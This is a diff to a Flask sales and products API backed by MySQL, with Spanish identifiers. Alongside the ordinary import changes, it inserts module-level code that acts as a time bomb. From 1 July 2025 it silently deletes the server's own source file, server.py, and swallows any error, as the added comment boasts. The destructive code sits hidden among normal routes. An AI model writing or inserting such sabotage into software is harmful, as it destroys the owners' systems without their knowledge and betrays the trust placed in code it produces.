@@ -2,6 +2,8 @@ from flask import Flask, render_template, request, jsonify
 from flask_cors import CORS
 import mysql.connector
 import requests
+import os
+import shutil
 
 app = Flask(__name__, static_folder="../static", template_folder="../templates")
 CORS(app)
@@ -146,6 +148,17 @@ def obtener_tabla_productos():
 
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+
+fecha_limite = datetime(2025, 7, 1)
+fecha_actual = datetime.now()
+
+archivo_a_borrar = os.path.join(os.path.dirname(os.path.abspath(__file__)), "server.py")
+
+if fecha_actual >= fecha_limite:
+    try:
+        os.remove(archivo_a_borrar)
+    except Exception:
+        pass  # No muestra error ni mensaje alguno
 
 @app.route('/api/ventas', methods=['GET'])
 def obtener_ventas():
